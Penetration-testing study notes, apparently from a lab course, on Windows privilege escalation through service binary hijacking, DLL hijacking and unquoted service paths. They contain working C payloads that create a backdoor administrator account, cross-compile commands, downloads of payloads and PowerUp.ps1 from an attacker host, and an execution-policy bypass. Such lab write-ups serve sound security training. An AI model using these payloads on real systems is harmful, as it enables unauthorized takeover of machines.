
> A Windows Service is a long-running background executable or application managed by the Service Control Manager and is similar to the concept of daemons on Unix systems.
> Windows services can be managed by the Services snap-in, PowerShell, or the **sc.exe** command line tool.
> Windows uses the LocalSystem (includes the SIDs of NT AUTHORITY\SYSTEM and BUILTIN\Administrators in its token), Network Service, and Local Service user accounts to run its own services.
> Users or programs creating a service can choose either one of those accounts, a domain user, or a local user.

# Service Binary Hijacking

### Scenario
Software developer creates a program and installs an application as a Windows service.
During the installation, the developer does not secure the permissions of the program, allowing full Read and Write access to all members of the Users group.
As a result, a lower-privileged user could replace the program with a malicious one.
To execute the replaced binary, the user can restart the service or, in case the service is configured to start automatically, reboot the machine.
Once the service is restarted, the malicious binary will be executed with the privileges of the service, such as _LocalSystem_.

Get a list of installed services
```powershell
Get-Service
```

Get a list of all running services
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
	Name                      State   PathName
	----                      -----   --------
	Apache2.4                 Running "C:\xampp\apache\bin\httpd.exe" -k runservice
	Appinfo                   Running C:\Windows\system32\svchost.exe -k netsvcs -p
	AppXSvc                   Running C:\Windows\system32\svchost.exe -k wsappx -p
	AudioEndpointBuilder      Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
	Audiosrv                  Running C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
	BFE                       Running C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
	BITS                      Running C:\Windows\System32\svchost.exe -k netsvcs -p
	BrokerInfrastructure      Running C:\Windows\system32\svchost.exe -k DcomLaunch -p
	...
	mysql                     Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
	...
```

List of services running *not* in `c:\windows\system32` path
```powershell
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {($_.State -like 'Running') -and ($_.PathName -notlike 'C:\Windows\system32\*')}
	Name          State   PathName
	----          -----   --------
	Apache2.4     Running "C:\xampp\apache\bin\httpd.exe" -k runservice
	BetaService   Running C:\Users\steve\Documents\BetaServ.exe
	edgeupdate    Running "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
	LSM           Running
	mysql         Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
	uhssvc        Running "C:\Program Files\Microsoft Update Health Tools\uhssvc.exe"
	VGAuthService Running "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
	VMTools       Running "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
	WinDefend     Running "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MsMpEng.exe"
```

These services/ binaries stand out as they're not running from the System32 path.
- Means they're user-installed and the software developer is in charge of the directory structure as well as permissions of the software

To enumerate the binary's permissions, use **icacls**.

Will output the current principles and their permission mask:

| Mask | Permissions             |
| ---- | ----------------------- |
| F    | Full access             |
| M    | Modify access           |
| RX   | Read and execute access |
| R    | Read-only access        |
| W    | Write-only access       |

```powershell
PS C:\Users\dave> icacls "c:\xampp\apache\bin\httpd.exe"
	c:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(F)
	                              NT AUTHORITY\SYSTEM:(F)
	                              BUILTIN\Users:(RX)
	                              NT AUTHORITY\Authenticated Users:(RX)


PS C:\Users\dave> icacls "c:\xampp\mysql\bin\mysqld.exe"
	c:\xampp\mysql\bin\mysqld.exe BUILTIN\Administrators:(F)
	                              NT AUTHORITY\SYSTEM:(F)
	                              BUILTIN\Users:(F)
```
	- httpd service - users have read and execute access
	- mysqld service - users have full access - allows us to write & modify (aka replace) the file

Create binary to replace
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  i = system ("net localgroup 'Remote Desktop Users' dave2 /add");
  
  return 0;
}
```
	- Will add a new user *dave2* with password *password123!*
	- Add new user to Administrators group
	- Will add new user to RDP group

Cross-compile & start a python server
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

python3 -m http.server 80
```

Download to victim machine and replace mysqld.exe
```powershell
PS C:\Users\dave> iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

As most services are only managed by administrative users, we won't have permission to stop/ restart it.

However, If the service _Startup Type_ is set to "Automatic", we may be able to restart the service by rebooting the machine.
- Check start mode
```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
	Name  StartMode
	----  ---------
	mysql Auto
```

- Check user's privileges for reboot
```powershell
PS C:\Users\dave> whoami /priv
	PRIVILEGES INFORMATION
	----------------------
	
	Privilege Name                Description                          State
	============================= ==================================== ========
	SeSecurityPrivilege           Manage auditing and security log     Disabled
	SeShutdownPrivilege           Shut down the system                 Disabled     #<-- NOTE
	SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
	SeUndockPrivilege             Remove computer from docking station Disabled
	SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
	SeTimeZonePrivilege           Change the time zone                 Disabled
```

> The _Disabled_ state only indicates if the privilege is currently enabled for the running process. In our case, it means that whoami has not requested and is not currently using the *SeShutdownPrivilege* privilege.

- Issue a reboot
```powershell
shutdown /r /t 0
```

Can verify it worked by RDP'ing back in as `dave` and check
```powershell
PS C:\Users\dave> Get-LocalGroupMember administrators

	ObjectClass Name                      PrincipalSource
	----------- ----                      ---------------
	User        CLIENTWK220\Administrator Local
	User        CLIENTWK220\BackupAdmin   Local
	User        CLIENTWK220\dave2         Local
	User        CLIENTWK220\daveadmin     Local
	User        CLIENTWK220\offsec        Local
```

Will now need to switch over to new user `dave2` AND start a powershell terminal using Admin privs
```powershell
# Switch to new user
PS C:\Users\dave> runAs /user:dave2 powershell.exe

# Open PowerShell 'As Admin'
PS C:\Windows\system32> Start-Process powershell.exe -Verb runAs
```

## Automated PowerUp.ps1

- Stage PowerUp.ps1 tool
```bash
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80
```

- Download on victim and run
```powershell
PS C:\Users\dave> iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1

PS C:\Users\dave> powershell -ep bypass

PS C:\Users\dave>  . .\PowerUp.ps1

# Display services the current user can modify, such as the service binary or configuration files.
PS C:\Users\dave> Get-ModifiableServiceFile

	...
	ServiceName                     : mysql
	Path                            : C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
	ModifiableFile                  : C:\xampp\mysql\bin\mysqld.exe
	ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
	ModifiableFileIdentityReference : BUILTIN\Users
	StartName                       : LocalSystem
	AbuseFunction                   : Install-ServiceBinary -Name 'mysql'
	CanRestart                      : False
```


# Service DLL Hijacking

Without proper perms to abuse service binary hijacking, we can attempt to hijack a service's DLL load.

*Dynamic Link Libraries* provide functionality to programs or the OS.
- Contain code or resources (like icon files), for other executable files or objects to use.
- Provide a way for developers to use and integrate already existing functionality w/o 'reinventing the wheel' (think python libraries)
- Used to store functionality . by several components.
- Called *Shared Objects* on Unix systems

Several methods we can use:
- Overwrite a DLL the service binary uses
	- Though, service may not work as expected as the original DLL's functionality is missing
		- Most cases, still can lead to code execution
- Hijack the DLL *search order*
	- Defined by MS & determines what to inspect first when searching for DLLs.

> By default, all current Win versions have 'safe DLL search mode' enabled
> 	Implemented due to the high number of DLL hijacking vectors and ensures that DLLs are more difficult to hijack

#### Standard DLL search order
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

> When Safe DLL Search Mode is disabled, the current directory (5 above) is searched at position 2 - right after the app's dir

#### Exploitation
Due to either a flawed installation process or updates, a DLL is missing, and the binary attempts to load the DLL which doesn't exist on the system.

To exploit, place a malicious DLL (with the name of the missing DLL) in a path of the Search Order so it executes when the binary is started.

- Start by enumerating the services and check permissions on these files
```powershell
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {($_.State -like 'Running') -and ($_.PathName -notlike 'C:\windows\system32\*')}

	Name          State   PathName
	----          -----   --------
	Apache2.4     Running "C:\xampp\apache\bin\httpd.exe" -k runservice
	BetaService   Running C:\Users\steve\Documents\BetaServ.exe
	edgeupdate    Running "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
	LSM           Running
	mysql         Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
	uhssvc        Running "C:\Program Files\Microsoft Update Health Tools\uhssvc.exe"
	VGAuthService Running "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
	VMTools       Running "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
	WinDefend     Running "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MsMpEng.exe"
```

- Check permissions on the binary file
```powershell
PS C:\Users\steve> icacls .\Documents\BetaServ.exe
	.\Documents\BetaServ.exe NT AUTHORITY\SYSTEM:(F)
		 BUILTIN\Administrators:(F)
		 CLIENTWK220\steve:(RX)
		 CLIENTWK220\offsec:(F)
```

- Start up Procmon to observe any calls to missing DLLs
	- (**procmon64.exe** is in the C:\\tools\\procmon\\ directory)
- Add filter for service
	- Add > Apply > Ok
![](procmon_filter.png)

- Restart the service to capture processes
```powershell
PS C:\Users\steve> Restart-Service BetaService
	WARNING: Waiting for service 'BetaService (BetaService)' to start...
```

> Can add filters to narrow down further:
	- Operation - Contains - Reg - then - Include
	- Result - Is - NAME NOT FOUND - then - Include

![](procmon_results.png)
- As seen, the consecutive function calls follow the DLL search order starting w/ the app's dir & ending w/ the directories in the PATH env variable
- Confirmed
```powershell
PS C:\Users\steve> $env:path
	C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\steve\AppData\Local\Microsoft\WindowsApps;
```

As one of the directories is under our control, we can attempt to write our own malicious DLL in `C:\Users\steve\Documents`

#### DLL explanation

Each DLL can have an optional *entry point function* called *DllMain*
- Executed when processes or threads attach the DLL
- Generally contains four cases
	- Commonly used to perform initialization tasks for the DLL or related to exiting the DLL (when the DLL is loaded or unloaded by a process or thread)
		1. DLL_PROCESS_ATTACH   
		2. DLL_THREAD_ATTACH
		3. DLL_THREAD_DETACH
		4. DLL_PROCESS_DETACH
- If there isn't a *DllMain* entry point function, it only provides resources

```C++
# DLL code example
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

As *DLL_PROCESS_ATTACH* is used when a process is loading the DLL, that's the case we'll use

- Reuse the adduser.c code, adding *include* statement for the header file **windows.h**
```c++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

- Cross compile
```bash
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

- Transfer to victim computer and run
```powershell
PS C:\Users\steve> cd Documents

PS C:\Users\steve\Documents> iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll

PS C:\Users\steve\Documents> Restart-Service BetaService
	WARNING: Waiting for service 'BetaService (BetaService)' to start...

# Verify user was added and given Administrator group privs
PS C:\Users\steve\Documents> net user
	User accounts for \\CLIENTWK220
	
	-------------------------------------------------------------------------------
	Administrator            BackupAdmin              dave
	dave2                    daveadmin                DefaultAccount
...

PS C:\Users\steve\Documents> net localgroup administrators
	...
	Administrator
	BackupAdmin
	dave2
	...
```

- Once done can switch to admin user `dave2` within powershell and elevate powershell prompt to High Mandatory Level
```powershell
PS C:\Users\steve\Documents> runAs /user:dave2 powershell.exe
	Enter the password for dave2:
	Attempting to start powershell.exe as user "CLIENTWK220\dave2" ...

# In next powershell prompt, verify user, integrity level, and elevate
PS C:\Windows\system32> whoami
	clientwk220\dave2

PS C:\Windows\system32> whoami /groups
	GROUP INFORMATION
	-----------------
	
	Group Name                                                    Type             SID          Attributes                  
	============================================================= ================ ============ ==================================================
	...
	Mandatory Label\Medium Mandatory Level


PS C:\Windows\system32> Start-Process powershell.exe -Verb RunAs

# In next powershell prompt, verify integrity level
PS C:\Windows\system32> whoami /groups
	GROUP INFORMATION
	-----------------
	
	Group Name                                                    Type             SID          Attributes
	============================================================= ================ ============ ===============================================================
	...
	Mandatory Label\High Mandatory Level
```


# Unquoted Service Paths

Can be abused when the path of a service/ app contains one or more spaces and is not enclosed within quotes.
- Can be interpreted in various ways because it's unclear to the *CreateProcess* function what to use for the *IpApplicationName* parameter
	- Where the file name ends and the arguments begin.
	- Function starts interpreting the path from left to right until a space is reached.
	- For every spact in the file path, the function uses the preceding part as the file name by adding **.exe** & the rest as args.
- Useful when we have write permissions to a service's main directory & subdirectories but cannot replace files within them.  
  
Example:  
A service stored in a path such as `C:\Program Files\My Program\My Service\service.exe`

If the service path is stored unquoted, whenever Windows starts the service it will attempt to run an executable from the following paths:  
  
	C:\Program.exe  
	C:\Program Files\My.exe  
	C:\Program Files\My Program\My.exe  
	C:\Program Files\My Program\My service\service.exe  
  
So, could craft the malicious binary, and
- name it **Program.exe** and store in `C:\` directory
- name it **My.exe** and store it in  `C:\Program Files\` directory
- name it **My.exe** and store it in `C:\Program Files\My Program\`
	- First two would likely require perms a standard user wouldn't have
	- Third option more likely as it's the software's main directory.
		- If admin user or developer set the perms for this dir too open, we can put our malicious binary there.
  
- Enumerate running and stopped services
```powershell
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.PathName -notlike 'C:\windows\system32\*'}
	Name                      State   PathName
	----                      -----   --------
	...
	GammaService                             Stopped C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
	...
```

- More effective way to ID spaces in the paths and missing quotes is by using **wmic** in a **cmd** terminal
	- Also a great way to avoid escaping issues for the quote in the second *findstr* command
		- *Could* use the *Select-String* cmdlet in PowerShell
```powershell
C:\Users\steve> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
	Name                                       PathName                                                                     
	...                                                                                                         
	GammaService                               C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```
	- Service - Obtain service information
	- get Retrieve only these specific property values
	- First findstr:
		- /i - Case-insensitive
		- /v - Only print lines that don't match
		- "C:\Windows\\" - Show only services with a binary path outside the Windows directory.
	- Second findstr:
		- """ - Print only matches without quotes.

- Check our user can start & stop the service
```powershell
PS C:\Users\steve> Start-Service GammaService
	WARNING: Waiting for service 'GammaService (GammaService)' to start...

PS C:\Users\steve> Stop-Service GammaService
```
	- No errors meand we're GTG - no reboot needed

- Check access rights in the app's paths
```powershell
PS C:\Users\steve> icacls "C:\"
	...
	    NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
	    NT AUTHORITY\Authenticated Users:(AD)
	...


PS C:\Users\steve>icacls "C:\Program Files"
	...
		 BUILTIN\Users:(RX)
		 BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
	 ...

PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
	...
		 BUILTIN\Users:(OI)(CI)(RX,W)
	...
```
	- As thought, only directory `steve` has perms for (Write) is `C:\Program Files\ Enterprise Apps`


